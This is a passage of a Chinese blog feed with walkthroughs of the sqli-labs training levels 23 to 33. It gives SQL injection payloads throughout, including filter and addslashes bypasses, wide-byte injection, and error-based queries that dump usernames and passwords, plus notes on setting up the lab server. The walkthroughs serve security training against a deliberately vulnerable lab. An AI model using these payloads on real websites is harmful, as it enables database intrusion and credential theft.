alt="img"></p><p>暴数据：</p><p>?id=-1%df%27 union select 1,group_concat(username,0x7e,password),3 from security.users–+</p><p><img src="http://m.qpic.cn/psc?/V53QcDQN3M0Z4223G6is1vw7KQ0WDRYf/45NBuzDIW489QBoVep5mcUm9JVpcsmJygBODi9CK6eCkbspPXkQT5prx81Gw250GbppJhUxbJzVe1BanGyoPYLX9Yw.Y5bD.n92Ix5cnCnM!/b&bo=fwf7AgAAAAADN5M!&rf=viewer_4" alt="img"></p><h1 id="Less-33"><a href="#Less-33" class="headerlink" title="Less-33"></a>Less-33</h1><h3 id="GET型-绕过AddSlashes-函数"><a href="#GET型-绕过AddSlashes-函数" class="headerlink" title="GET型-绕过AddSlashes()函数"></a>GET型-绕过AddSlashes()函数</h3><p>本关直接使用了 PHP 的addslashes()函数，<br><strong>addslashes()与stripslashes()函数</strong><br><strong>addslashes(string)函数返回在预定义字符之前添加反斜杠\的字符串</strong>：<br>单引号 ‘<br>双引号 “<br>反斜杠 <br>空字符 NULL<br><strong>该函数可用于为存储在数据库中的字符串以及数据库查询语句准备字符串。</strong><br>注意：默认地，PHP对所有的GET、POST和COOKIE数据自动运行addslashes()。所以不应对已转义过的字符串使用addslashes()，因为这样会导致双层转义。遇到这种情况时可以使用函数get_magic_quotes_gpc()进行检测。<br>stripslashes(string)函数删除由addslashes()函数添加的反斜杠。</p><h3 id="判断和注入过程同-Less-32-完全相同。"><a href="#判断和注入过程同-Less-32-完全相同。" class="headerlink" title="判断和注入过程同 Less 32 完全相同。"></a>判断和注入过程同 Less 32 完全相同。</h3>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;宽字节注入&quot;&gt;&lt;a href=&quot;#宽字节注入&quot; class=&quot;headerlink&quot; title=&quot;宽字节注入&quot;&gt;&lt;/a&gt;宽字节注入&lt;/h1&gt;&lt;h2 id=&quot;原理&quot;&gt;&lt;a href=&quot;#原理&quot; class=&quot;headerlink&quot; title=&quot;原理&quot;&gt;&lt;/a&gt;原</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>sqlilabs-29,30,31</title>
    <link href="http://example.com/2021/02/08/sql-29-30-31/"/>
    <id>http://example.com/2021/02/08/sql-29-30-31/</id>
    <published>2021-02-08T07:40:02.000Z</published>
    <updated>2021-02-08T08:00:54.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="搭建双服务器-Tomcat和Apache"><a href="#搭建双服务器-Tomcat和Apache" class="headerlink" title="搭建双服务器-Tomcat和Apache"></a>搭建双服务器-Tomcat和Apache</h1><p><strong>由于第29，30，31关需要双服务器环境，即Tomcat和Apache。利用JSP和PHPStudy来搭建服务器，由于我们已经在PHPStudy上搭建好了Apache服务器，现在只需要在JSP上搭建Tomcat即可。</strong></p><h3 id="首先下载JSP"><a href="#首先下载JSP" class="headerlink" title="首先下载JSP"></a>首先下载JSP</h3><p><a href="https://www.xp.cn/download.html">https://www.xp.cn/download.html</a></p><p><img src="https://imgconvert.csdnimg.cn/aHR0cDovL2ltYWdlLmJ1YnVrby5jb20vaW5mby8yMDIwMDEvMjAyMDAxMjcxNTMzMzg5NzQ2NzgucG5n?x-oss-process=image/format,png" alt="ææ¯åäº«å¾ç"></p><p>修改vhost.conf文件</p><p><img src="https://img-blog.csdnimg.cn/20200428234605512.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl8zOTkzNDUyMA==,size_16,color_FFFFFF,t_70" alt="img"></p><h3 id="sqli-labs文件夹下面还有tomcat文件"><a href="#sqli-labs文件夹下面还有tomcat文件" class="headerlink" title="sqli-labs文件夹下面还有tomcat文件"></a>sqli-labs文件夹下面还有tomcat文件</h3><p><img src="http://m.qpic.cn/psc?/V53QcDQN3M0Z4223G6is1vw7KQ0WDRYf/45NBuzDIW489QBoVep5mceUyaW9eahds3.7kutj1kalKc6sRBlIVyJ5ac9peHmwBwFvcGdn2NlvRA83FhEs4w3LNRQFkbFOKwyLhlmxRFQk!/b&bo=ygO6AgAAAAADF0M!&rf=viewer_4" alt="img"></p><h3 id="解压放到JSPstudy的www目录下"><a href="#解压放到JSPstudy的www目录下" class="headerlink" title="解压放到JSPstudy的www目录下"></a>解压放到JSPstudy的www目录下</h3><p>接下来修改URL，改成你自己设置的：修改2处</p><p><img src="http://m.qpic.cn/psc?/V53QcDQN3M0Z4223G6is1vw7KQ0WDRYf/45NBuzDIW489QBoVep5mceUyaW9eahds3.7kutj1kamoGPTDvFM8NYxVZV3MSb7uvkm*BrY*ryMNQNURrebH.EWDU*WcDSledNIKSbBJQNI!/b&bo=pQMOAgAAAAADF5g!&rf=viewer_4" alt="img"></p><p><img src="http://m.qpic.cn/psc?/V53QcDQN3M0Z4223G6is1vw7KQ0WDRYf/45NBuzDIW489QBoVep5mcfhO0Ygo4w*VHU.0xpTDUxkRCs52Q0V1se3m*yWRbKHLwMMhl5qqH46Q6kCf0PDCcx7OdeNakJn4o*UWTjPiH*E!/b&bo=IgOiAQAAAAADF7A!&rf=viewer_4" alt="img"></p><h3 id="重启JSPStudy和PHPStudy"><a href="#重启JSPStudy和PHPStudy" class="headerlink" title="重启JSPStudy和PHPStudy"></a>重启JSPStudy和PHPStudy</h3><p>成功看到以下页面：</p><p><img src="http://m.qpic.cn/psc?/V53QcDQN3M0Z4223G6is1vw7KQ0WDRYf/45NBuzDIW489QBoVep5mcfhO0Ygo4w*VHU.0xpTDUxlFxgBfYw0HESUDlk19*FvT7Wol8tc3JFXbsa7r5ZPfqQrF4*VddsOBbH80vvV5LnQ!/b&bo=BAekAwAAAAADR8Y!&rf=viewer_4" alt="img"></p><p>接下来依次修改Less-30，Less-31。</p><h1 id="less-29"><a href="#less-29" class="headerlink" title="less-29"></a>less-29</h1><p><img src="https://img-blog.csdnimg.cn/20200429230041539.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl8zOTkzNDUyMA==,size_16,color_FFFFFF,t_70" alt="img"></p><p><strong>单引号字符注入</strong></p><p>然后就是注入。30关、31关也是类似。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;搭建双服务器-Tomcat和Apache&quot;&gt;&lt;a href=&quot;#搭建双服务器-Tomcat和Apache&quot; class=&quot;headerlink&quot; title=&quot;搭建双服务器-Tomcat和Apache&quot;&gt;&lt;/a&gt;搭建双服务器-Tomcat和Apache&lt;/h1&gt;&lt;</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>sql-25-28</title>
    <link href="http://example.com/2021/02/04/sql-26-28/"/>
    <id>http://example.com/2021/02/04/sql-26-28/</id>
    <published>2021-02-04T07:40:05.000Z</published>
    <updated>2021-02-04T08:22:40.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Less-25"><a href="#Less-25" class="headerlink" title="Less-25"></a>Less-25</h1><h3 id="基于错误-您所有的OR＆AND都属于我们-字符串单引号"><a href="#基于错误-您所有的OR＆AND都属于我们-字符串单引号" class="headerlink" title="基于错误-您所有的OR＆AND都属于我们-字符串单引号"></a>基于错误-您所有的OR＆AND都属于我们-字符串单引号</h3><p><img src="http://m.qpic.cn/psc?/V53QcDQN3M0Z4223G6is1vw7KQ0WDRYf/45NBuzDIW489QBoVep5mcU1gIesnf*U*4pgdUv3XgY2fLGVeaL0Qs3IJB5xVfJUibRT1Ek15gYy2ttzLJifaZh2IELVf4UsRBB0q7hhTg2w!/b&bo=lQa5AwAAAAADR0s!&rf=viewer_4" alt="img"></p><p>翻译：</p><p>注意：未定义变量：在第81行的C：\ phpStudy \ WWW \ sqli \ Less-25 \ index.php中提示<br>提示：将使用以下结果过滤您的输入：</p><p>一上来就有报错与提示信息。</p><p><img src="https://img-blog.csdnimg.cn/20200421221328936.png" alt="img"></p><h4 id="有过滤的时候首先要判断这个过滤是一次性的还是非一次性的："><a href="#有过滤的时候首先要判断这个过滤是一次性的还是非一次性的：" class="headerlink" title="有过滤的时候首先要判断这个过滤是一次性的还是非一次性的："></a>有过滤的时候首先要判断这个过滤是一次性的还是非一次性的：</h4><p><strong>若是一次性的，且只是将过滤字符换成了空字符：</strong></p><p><strong>双写绕过—— or=oorr、and=anandd</strong></p><h4 id="若是非一次性的，就要考虑一些变形："><a href="#若是非一次性的，就要考虑一些变形：" class="headerlink" title="若是非一次性的，就要考虑一些变形："></a>若是非一次性的，就要考虑一些变形：</h4><p><strong>大小写变形绕过—— or=Or=oR=OR</strong><br><strong>利用运算符——   or=||、and=&amp;&amp;</strong><br><strong>URL编码绕过——  #=%23，Hex编码—— ~=0x7e</strong><br><strong>添加注释  ——  /<em>or</em>/</strong></p><h2 id="双写绕过"><a href="#双写绕过" class="headerlink" title="双写绕过"></a>双写绕过</h2><h3 id="暴字段："><a href="#暴字段：" class="headerlink" title="暴字段："></a>暴字段：</h3><p><strong>?id=1’ oorrder by 3– #</strong></p><p><img src="http://m.qpic.cn/psc?/V53QcDQN3M0Z4223G6is1vw7KQ0WDRYf/45NBuzDIW489QBoVep5mcU1gIesnf*U*4pgdUv3XgY0SMJGvbFIWVwsmhe65hNerpupZBNBULj0J92or1.Ism3.6XDAUyzOiWcymiQ2CzdM!/b&bo=mgYGAwAAAAADN4s!&rf=viewer_4" alt="img"></p><p><strong>?id=-1’ union select 1,2,3– #</strong></p><p><img src="http://m.qpic.cn/psc?/V53QcDQN3M0Z4223G6is1vw7KQ0WDRYf/45NBuzDIW489QBoVep5mcU1gIesnf*U*4pgdUv3XgY2.v344gRA16jjjltSHXtJgzelv23QOpvKTVX94CffTIE86swLcag7l0v1Ih7EGo5o!/b&bo=rgYfAwAAAAADN6Y!&rf=viewer_4" alt="img"></p><h3 id="暴库："><a href="#暴库：" class="headerlink" title="暴库："></a>暴库：</h3><p><strong>?id=-1’ union select 1,user(),database()– #</strong></p><p><img src="http://m.qpic.cn/psc?/V53QcDQN3M0Z4223G6is1vw7KQ0WDRYf/45NBuzDIW489QBoVep5mcZPwz.H1vycN05SNQMon5h2*Jp1yKUmcGIa6lISdB3ncHYaI.rVViY7MbuoxPBFl32ARa.ce7JeAg*ZEW7sKH2A!/b&bo=IwffAgAAAAADN.s!&rf=viewer_4" alt="img"></p><h3 id="爆表："><a href="#爆表：" class="headerlink" title="爆表："></a>爆表：</h3><p><strong>?id=-1’ union select 1,(select group_concat(table_name) from infoorrmation_schema.tables where table_schema=’security’),3– #</strong></p><p><img src="http://m.qpic.cn/psc?/V53QcDQN3M0Z4223G6is1vw7KQ0WDRYf/45NBuzDIW489QBoVep5mcZPwz.H1vycN05SNQMon5h2lrRTacE1boIT9Tb86rm3VCjTS4Gsy4z2s29LB2PbJ.Q.b7aLiW5VR8EGzKVAmfyQ!/b&bo=.AbiAgAAAAADNww!&rf=viewer_4" alt="img"></p><h3 id="爆字段："><a href="#爆字段：" class="headerlink" title="爆字段："></a>爆字段：</h3><p><strong>?id=-1’ union select 1,(select group_concat(column_name) from infoorrmation_schema.columns where table_schema=’security’ anandd table_name=’users’),3– #</strong></p><p><img src="http://m.qpic.cn/psc?/V53QcDQN3M0Z4223G6is1vw7KQ0WDRYf/45NBuzDIW489QBoVep5mcZPwz.H1vycN05SNQMon5h1MPzUtGZ0hstgdW4AMtGIQ06FCrmQ*2ntbkrl37yhYi45KpR*2DRFOQrQBHeI92tg!/b&bo=6wblAgAAAAADNxg!&rf=viewer_4" alt="img"></p><h3 id="爆数据："><a href="#爆数据：" class="headerlink" title="爆数据："></a>爆数据：</h3><p><strong>?id=-1’ union select 1,(select group_concat(concat_ws(‘-‘,id,username,passwoorrd)) from users),3– #</strong></p><p><img src="http://m.qpic.cn/psc?/V53QcDQN3M0Z4223G6is1vw7KQ0WDRYf/45NBuzDIW489QBoVep5mcZPwz.H1vycN05SNQMon5h1cl0YLpThfHmjXMxacpn1ua17x1i3g9Ph9BtPDZ4nm4ml3mi6.ReIN0X*GHAWy3HY!/b&bo=YwehAgAAAAADN9U!&rf=viewer_4" alt="img"></p><h2 id="运算符绕过"><a href="#运算符绕过" class="headerlink" title="运算符绕过"></a>运算符绕过</h2><p><strong>?id=-1’ || extractvalue(1,concat(0x7e,database()))– #</strong></p><p>或者</p><p><strong>?id=1’ || extractvalue(1,concat(0x7e,database()))– #</strong>   都是一样的，理解or和函数extractvalue在一起的作用就会明白这两种写法都对。</p><h1 id="Less-25a"><a href="#Less-25a" class="headerlink" title="Less-25a"></a>Less-25a</h1><h3 id="基于Bool-GET-过滤AND-OR-数字型-盲注"><a href="#基于Bool-GET-过滤AND-OR-数字型-盲注" class="headerlink" title="基于Bool_GET_过滤AND/OR_数字型_盲注"></a>基于Bool_GET_过滤AND/OR_数字型_盲注</h3><p>本关与Less-25十分相似，既可以正常union注入也可以用脚本Bool或Time盲注。但却不能报错注入</p><p><strong>原因在于没有输出错误项，即关闭了错误报告。</strong></p><p>不在重复</p><h1 id="Less-26"><a href="#Less-26" class="headerlink" title="Less-26"></a>Less-26</h1><h3 id="GET-基于错误-您所有的空格和注释都属于我们"><a href="#GET-基于错误-您所有的空格和注释都属于我们" class="headerlink" title="GET-基于错误-您所有的空格和注释都属于我们"></a>GET-基于错误-您所有的空格和注释都属于我们</h3><p>根据提示我们知道这一关过滤了空格和注释，实际上过滤的远远不止这些，我们来看下源码：</p><p><img src="https://img-blog.csdnimg.cn/20200425101208867.png" alt="img"></p><p>可以确认一下：</p><p>　　　　<strong>?id=%231　　//确认过滤了#</strong></p><p>　　　　<strong>?id=or1　　//确认过滤了or</strong></p><p>　　　　*<em>?id=/<em>1　　//确认过滤了多行注释</em></em>　　</p><p>　　　　<strong>?id=–1　　//确认过滤了单行注释</strong></p><p>　　　　<strong>?id=/1　　//确认过滤了斜杠</strong></p><p>　　　　<strong>?id=1’ ‘ ‘　　//确认过滤了空格，报错注入才行</strong></p><p>　　　　<strong>?id=\　　//确认过滤了反斜杠</strong></p><h3 id="暴库：-1"><a href="#暴库：-1" class="headerlink" title="暴库："></a>暴库：</h3><p>（注：url编码%26是运算符&amp;，下面的%26%26换成运算符||也是可以的，但不能直接用&amp;&amp;，会报错，原理还不清楚，但使用&amp;的url编码%26就不会报错）</p><p><strong>?id=’%0bunion%0bselect%0b1,database(),3%26%26’7’=’7</strong></p><h3 id="爆表：-1"><a href="#爆表：-1" class="headerlink" title="爆表："></a>爆表：</h3><p>id=’union%0bselect%0b1,group_concat(table_name),3%0bfrom%0binfoorrmation_schema.tables%0bwhere%0btable_schema=’security’%26%26%0b’7’=’7</p><h3 id="爆字段"><a href="#爆字段" class="headerlink" title="爆字段"></a>爆字段</h3><p>id=’union%0bselect%0b1,group_concat(column_name),3%0bfrom%0binfoorrmation_schema.columns%0bwhere%0btable_schema=’security’%0baandnd%0btable_name=’users’%26%26%0b’7’=’7</p><h3 id="爆数据：-1"><a href="#爆数据：-1" class="headerlink" title="爆数据："></a>爆数据：</h3><p>id=’union%0bselect%0b1,group_concat(username,0x7e,passwoorrd),3%0bfrom%0busers%0bwhere%0b’7’=’7</p><h2 id="用updatexml函数"><a href="#用updatexml函数" class="headerlink" title="用updatexml函数"></a>用updatexml函数</h2><p>爆数据库：</p><p>?id=’||updatexml(1,concat(‘$’,(database())),0)||’1’=’1</p><p>爆表：</p><p>?id=’||updatexml(1,concat(‘$’,(select(group_concat(table_name))from(infoorrmation_schema.tables)where(table_schema=’security’))),0)||’1’=’1</p><p>爆字段：</p><p>?id=’||updatexml(1,concat(‘$’,(select(group_concat(column_name))from(infoorrmation_schema.columns)where(table_schema=’security’)%26%26(table_name=’users’))),0)||’1’=’1</p><p>爆数据：</p><p>?id=’||updatexml(1,concat(‘$’,(select(concat(‘$’,id,’$’,username,’$’,passwoorrd))from(users)limit%0b0,1)),0)||’1’=’1</p><h1 id="Less-26a"><a href="#Less-26a" class="headerlink" title="Less-26a"></a>Less-26a</h1><h3 id="基于错误-GET-过滤空格-注释-单引号-小括号-字符型-盲注"><a href="#基于错误-GET-过滤空格-注释-单引号-小括号-字符型-盲注" class="headerlink" title="基于错误_GET_过滤空格/注释_单引号_小括号_字符型_盲注"></a>基于错误_GET_过滤空格/注释_单引号_小括号_字符型_盲注</h3><p><img src="https://img-blog.csdnimg.cn/20200425194231463.png" alt="img"></p><p><img src="https://img-blog.csdnimg.cn/20200425194300910.png" alt="img"></p><p>这关与 26 的区别在于，sql 语句添加了一个括号，同时在 sql 语句执行抛出错误后并不在前台页面输出。所有我们排除报错注入，这里依旧是利用 union 注入，布尔盲注，延时注入。</p><p>?id=1’        报错，可初步得出是单引号字符型注入</p><p>?id=1’||’ 和?id=1’||1’ 会让我们误判为就是单引号字符型注入，因为带入源码中id=(‘1’||’’)和id=(‘1’||’1’)返回的结果都会是id=1 所以可以使用下面的语句来快速判断是否带有一个小括号，或者用前面讲的判断是否有小括号的方法也是一样的。</p><p>?id=1’)||(‘           (因为我们过滤了注释，使用这种可以很快的判断出是否是带一个括号的注入点)</p><p>暴库：</p><p>?id=’)%0bunion%0bselect%0b1,database(),3%0b||(‘1’)=(‘1</p><p>简写点：</p><p>?id=’)%0bunion%0bselect%0b1,database(),3%0b||1=(‘1</p><p>爆表：</p><p>id=’)%0bunion%0bselect%0b1,group_concat(table_name),3%0bfrom%0binfoorrmation_schema.tables%0bwhere%0btable_schema=’security’%26%261=(‘1</p><p>爆字段：</p><p>id=’)%0bunion%0bselect%0b1,group_concat(column_name),3%0bfrom%0binfoorrmation_schema.columns%0bwhere%0btable_schema=’security’%0baandnd%0btable_name=’users’%26%261=(‘1</p><p>爆数据：</p><p>id=’)%0bunion%0bselect%0b1,group_concat(passwoorrd,0x7e,username),3%0bfrom%0busers%0bwhere%0b1=(‘1</p><h1 id="Less-27"><a href="#Less-27" class="headerlink" title="Less-27"></a>Less-27</h1><h3 id="基于错误-GET-过滤UNION-SELECT-单引号-字符型注入"><a href="#基于错误-GET-过滤UNION-SELECT-单引号-字符型注入" class="headerlink" title="基于错误_GET_过滤UNION/SELECT_单引号_字符型注入"></a>基于错误_GET_过滤UNION/SELECT_单引号_字符型注入</h3><p>先判断注入类型，发现是单引号字符型注入</p><p><img src="https://img-blog.csdnimg.cn/20200426225124835.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl8zOTkzNDUyMA==,size_16,color_FFFFFF,t_70" alt="img"></p><p>发现没有过滤or与and，过滤了几个大小写的union和select但是可以用随机大小写绕过，过滤了–、#以及/**/，过滤了两次空格，过滤了/但没过滤\。<br>所以实际上只过滤了注释与空格，与 Less 26 相似。</p><h3 id="直接大小写混合绕过即可"><a href="#直接大小写混合绕过即可" class="headerlink" title="直接大小写混合绕过即可"></a>直接大小写混合绕过即可</h3><p>暴库：</p><p>?id=0’/<em>%0a</em>/UnIoN/<em>%0a</em>/SeLeCt/<em>%0a</em>/1,database(),2/<em>%0a</em>/||/<em>%0a</em>/‘1’=’1</p><p>爆表：</p><p>?id=0’%0aUnIoN%0aSeLeCt%0a1，(SeLeCt%0agroup_concat(table_name)%0afrom%0ainformation_schema.tables%0awhere%0atable_schema=’security’),3||’1</p><p>爆字段：</p><p>?id=0’%0buniOn%0bsElEct%0b1,(group_concat(column_name)),3%0bfrom%0binformation_schema.columns%0bwhere%0btable_schema=’security’%0bAnd%0btable_name=’users’%0b%26%26%0b’1’=’1</p><p>爆数据：</p><p>?id=0’/<em>%0a</em>/UnIoN/<em>%0a</em>/SeLeCt/<em>%0a</em>/1,(SeLeCt/<em>%0a</em>/group_concat(concat_ws(‘$’,id,username,password))/<em>%0a</em>/from/<em>%0a</em>/users),3/<em>%0a</em>/||/<em>%0a</em>/‘1’=’1</p><h1 id="Less-27a"><a href="#Less-27a" class="headerlink" title="Less-27a"></a>Less-27a</h1><h3 id="基于盲注-GET-过滤UNION-SELECT-双引号-字符型"><a href="#基于盲注-GET-过滤UNION-SELECT-双引号-字符型" class="headerlink" title="基于盲注_GET_过滤UNION/SELECT_双引号_字符型"></a>基于盲注_GET_过滤UNION/SELECT_双引号_字符型</h3><p><img src="https://img-blog.csdnimg.cn/20200426234530920.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl8zOTkzNDUyMA==,size_16,color_FFFFFF,t_70" alt="img"></p><p><img src="https://img-blog.csdnimg.cn/20200426234557986.png" alt="img"></p><p><img src="https://img-blog.csdnimg.cn/20200426234504109.png" alt="img"></p><p>双引号字符型注入<br>没有错误回显，不能进行报错注入，即无法使用updatexml函数等，但可以进行布尔盲注，因为他有无错误回显，即正确和错误页面返回的页面不同。<br>可以使用union联合注入，延时盲注。</p><h1 id="Less-28"><a href="#Less-28" class="headerlink" title="Less-28"></a>Less-28</h1><h3 id="基于错误的，单引号字符型，过滤了union和select等的注入"><a href="#基于错误的，单引号字符型，过滤了union和select等的注入" class="headerlink" title="基于错误的，单引号字符型，过滤了union和select等的注入"></a>基于错误的，单引号字符型，过滤了union和select等的注入</h3><p><img src="https://img-blog.csdnimg.cn/20200427230419929.png" alt="img"></p><p><strong>发现没有过滤or与and。</strong><br><strong>过滤了相连的union和select，/i同时匹配大小写，\s匹配任意空白字符如制表符、换行符、空格等，使用%a0等空格的URL编码可以绕过。</strong><br><strong>过滤了–、#以及/</strong>/。**<br><strong>过滤了两次空格。</strong><br><strong>过滤了/但没过滤\。</strong></p><p>这一关和Less-27a十分相似，可以利用联合注入，布尔盲注，延时注入。</p><h1 id="Less-28a"><a href="#Less-28a" class="headerlink" title="Less-28a"></a>Less-28a</h1><h3 id="基于盲注的，带括号的单引号字符型，过滤了union和select等的注入"><a href="#基于盲注的，带括号的单引号字符型，过滤了union和select等的注入" class="headerlink" title="基于盲注的，带括号的单引号字符型，过滤了union和select等的注入"></a>基于盲注的，带括号的单引号字符型，过滤了union和select等的注入</h3><p><strong>本关与 28 基本一致，只是过滤条件少了几个。</strong></p><p><img src="https://img-blog.csdnimg.cn/20200427233353774.png" alt="img"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;Less-25&quot;&gt;&lt;a href=&quot;#Less-25&quot; class=&quot;headerlink&quot; title=&quot;Less-25&quot;&gt;&lt;/a&gt;Less-25&lt;/h1&gt;&lt;h3 id=&quot;基于错误-您所有的OR＆AND都属于我们-字符串单引号&quot;&gt;&lt;a href=&quot;#基于错误-您</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>sql-23</title>
    <link href="http://example.com/2021/01/27/sql-23/"/>
    <id>http://example.com/2021/01/27/sql-23/</id>
    <published>2021-01-27T08:09:45.000Z</published>
    <updated>2021-01-27T08:44:40.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Less-23-基于错误的，过滤注释的GET型"><a href="#Less-23-基于错误的，过滤注释的GET型" class="headerlink" title="Less-23  基于错误的，过滤注释的GET型"></a>Less-23  基于错误的，过滤注释的GET型</h1><p><strong>判断注入类型：</strong></p><p><strong>?id=1 ?id=1’ ?id=1” 发现第二条语句报错：</strong></p><p><img src="http://m.qpic.cn/psc?/V53QcDQN3M0Z4223G6is1vw7KQ0WDRYf/45NBuzDIW489QBoVep5mcUO9ZRemArWd3DuY6FZznYM2EDWRE9HNp8tXjW6mcEGz6oo*jw11EU6T7Iiqo79hkSuicS*Fy0ZfYOaeYgN897Y!/b&bo=2gYGAgAAAAADN8o!&rf=viewer_4" alt="img"></p><p>从这里可以看出是单引号闭合的查询，这里报错还把站点路径爆出来了。</p><p>出现了一行文字</p><p>翻译：</p><p>警告：mysql_fetch_array（）期望参数1为资源，布尔值在第38行的C：\ phpStudy \ WWW \ sqli \ Less-23 \ index.php中给出您的SQL语法有误。 检查与您的MySQL服务器版本对应的手册以获取正确的语法，以在第1行的“ 1” LIMIT 0,1’附近使用</p><p><strong>我们查看下源代码：</strong></p><p><img src="https://img-blog.csdnimg.cn/20200417230442690.png" alt="img"></p><p><img src="https://img-blog.csdnimg.cn/20200417230510647.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl8zOTkzNDUyMA==,size_16,color_FFFFFF,t_70" alt="img"></p><blockquote><h3 id="preg-replace-函数"><a href="#preg-replace-函数" class="headerlink" title="preg_replace() 函数"></a>preg_replace() 函数</h3></blockquote><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">preg_replace(<span class="keyword">pattern</span>,replacement,subject[,limit<span class="operator">=</span><span class="number">-1</span>[,<span class="operator">&amp;</span>count]])</span><br></pre></td></tr></table></figure><table><thead><tr><th>参数</th><th>描述</th></tr></thead><tbody><tr><td>pattern</td><td>要搜索的模式，可以是字符串或一个字符串数组</td></tr><tr><td>replacement</td><td>用于替换的字符串或字符串数组</td></tr><tr><td>subject</td><td>要搜索替换的目标字符串或字符串数组</td></tr><tr><td>limit</td><td>可选，对于每个模式用于每个 subject 字符串的最大可替换次数。 默认是-1（无限制）</td></tr><tr><td>count</td><td>可选，为替换执行的次数</td></tr></tbody></table><p><code>preg_replace()</code>函数执行一个正则表达式的搜索和替换，搜索<code>subject</code>中匹配<code>pattern</code>的部分， 以<code>replacement</code>进行替换。</p><p>如果<code>subject</code>是一个数组，<code>preg_replace()</code>返回一个数组，其他情况下返回一个字符串。<br>如果匹配被查找到，替换后的<code>subject</code>被返回，其他情况下返回没有改变的<code>subject</code>。如果发生错误，返回<code>NULL</code>。</p><p>在这关中，也只是将<code>#</code>和<code>--</code>替换成了<code>空字符</code>。</p><h3 id="查找注入点："><a href="#查找注入点：" class="headerlink" title="查找注入点："></a>查找注入点：</h3><p>?id=-1’ union select 1,2,3 or ‘1’=’1</p><p><img src="http://m.qpic.cn/psc?/V53QcDQN3M0Z4223G6is1vw7KQ0WDRYf/45NBuzDIW489QBoVep5mcUO9ZRemArWd3DuY6FZznYNnOO5aCjjrxJqwxO1g7rKk2lrKIngs*NbqcLDwW8HNuvo6D4U0U.gU*a.JkThzW7Q!/b&bo=cQZDAwAAAAADNyU!&rf=viewer_4" alt="img"></p><p><strong>唯一的回显字段便是username即字段2，这也是唯一的注入点。</strong></p><h3 id="暴库："><a href="#暴库：" class="headerlink" title="暴库："></a>暴库：</h3><p>?id=-1’ union select 1,database(),3 or ‘1’=’1</p><p><img src="http://m.qpic.cn/psc?/V53QcDQN3M0Z4223G6is1vw7KQ0WDRYf/45NBuzDIW489QBoVep5mcUO9ZRemArWd3DuY6FZznYO4q*yZXrewKOdnjiRVq3cjKx7AU7qAe9uwpVxRBiS8BFZTGzUT5VH09UIoZb3zV60!/b&bo=VwZQAwAAAAADNxA!&rf=viewer_4" alt="img"></p><h3 id="暴表："><a href="#暴表：" class="headerlink" title="暴表："></a>暴表：</h3><p><strong>注意：</strong>因为这里涉及到<code>where</code>与<code>or</code>语句的混合，只能用<strong>双注入</strong>即<strong>CONCAT子查询</strong>。</p><p>?id=-1’ union select 1,(select group_concat(table_name) from information_schema.tables where table_schema=’security’),3 or ‘1’=’1</p><p><img src="http://m.qpic.cn/psc?/V53QcDQN3M0Z4223G6is1vw7KQ0WDRYf/45NBuzDIW489QBoVep5mcUO9ZRemArWd3DuY6FZznYMbQ5s.AExLXXYgEuP5bOzxatdSA4ZrBa4Thngo0tOy4oPr6LnQ1Zt.Y.Kg4uVLfW0!/b&bo=UAYwAwAAAAADN3c!&rf=viewer_4" alt="img"></p><h3 id="暴字段："><a href="#暴字段：" class="headerlink" title="暴字段："></a>暴字段：</h3><p>?id=-1’ union select 1,(select group_concat(column_name) from information_schema.columns where table_schema=’security’ and table_name=’users’),3 or ‘1’=’1</p><p><img src="http://m.qpic.cn/psc?/V53QcDQN3M0Z4223G6is1vw7KQ0WDRYf/45NBuzDIW489QBoVep5mcQzKo4PmYZsYkY.TJc4H3xpXs8bomxlFOFgcpwqefqgXqif2fkncK*O59o9biwHK.KhrDF8xxBtM1x7MSM4KZEo!/b&bo=rwYqAwAAAAADN5I!&rf=viewer_4" alt="img"></p><h3 id="暴数据："><a href="#暴数据：" class="headerlink" title="暴数据："></a>暴数据：</h3><p>?id=-1’ union select 1,(select group_concat(concat_ws(‘-‘,id,username,password)) from users),3 and ‘1’=’1</p><p><img src="http://m.qpic.cn/psc?/V53QcDQN3M0Z4223G6is1vw7KQ0WDRYf/45NBuzDIW489QBoVep5mcV7c.1PTy9X*krPwfmlmpQz9THL7Scz1NdeTPzylF5pV.3n1Ree3e7GRigcS1**R7TONDQ70H4kk3DHmMJ.9o0Q!/b&bo=cgcsAwAAAAADN0g!&rf=viewer_4" alt="img"></p><p><em>这里要注意一下，在爆数据的时候，不能在使用and的时候直接查询，必须要用双子注入查询，否则会报错：</em></p><p>*<strong>select 1,group_concat(username),3 from users and ‘1’=’1</strong>  from和and是不能连在一起用的*</p><p><strong>注入方法有很多，对于基于错误的报错型注入，前面我们使用的注入方法这里都可以使用。</strong></p><p><strong>比如：</strong></p><p><strong>盲注</strong></p><p><strong>这里盲注就得使用and，而不能使用or</strong>  </p><p><strong>?id=1’ and left(version(),1)=5 and ‘1’=’1</strong></p><p><strong>?id=1’ and left(version(),1)=6 and ‘1’=’1</strong></p><p><strong>（PS：and和or同时使用and的优先级高于or,哪怕不考虑优先级也不能使用or,因为 ‘1’=’1’是永真条件，不管前面查询的条件时真假，到最后都会变成 真条件）</strong></p>]]></content>
    
    
      
      
